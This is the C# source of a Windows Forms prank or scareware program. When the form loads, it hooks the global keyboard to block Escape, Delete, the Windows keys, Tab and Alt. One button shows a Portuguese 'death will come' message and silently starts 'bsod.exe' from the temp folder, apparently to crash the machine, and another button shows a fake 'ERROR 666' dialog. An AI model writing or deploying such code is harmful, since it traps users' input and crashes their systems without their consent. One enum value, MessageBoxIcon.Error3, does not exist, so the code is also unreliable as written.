using System;
using System.Windows.Forms;
using Utilities;
using System.Diagnostics;
using System.Threading;


namespace CreepyProject
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Thread.Sleep(1000);
            MessageBox.Show("ERROR 666 0x666666", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error3);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            globalKeyboardHook gkh = new globalKeyboardHook();
            gkh.HookedKeys.Add(Keys.Escape);
            gkh.HookedKeys.Add(Keys.Delete);
            gkh.HookedKeys.Add(Keys.RWin);
            gkh.HookedKeys.Add(Keys.LWin);
            gkh.HookedKeys.Add(Keys.Tab);
            gkh.HookedKeys.Add(Keys.Alt);



            gkh.KeyDown += new KeyEventHandler(handleKey);
            gkh.hook();
        }

        private void handleKey(object sender, KeyEventArgs e)
        {

            e.Handled = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            string temp = System.IO.Path.GetTempPath();
            MessageBox.Show("A morte virá em instantes. Boa sorte.");


            ProcessStartInfo psi1 = new ProcessStartInfo(temp + "bsod.exe");
            psi1.CreateNoWindow = true; 
            psi1.UseShellExecute = false;
            Process.Start(psi1);
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
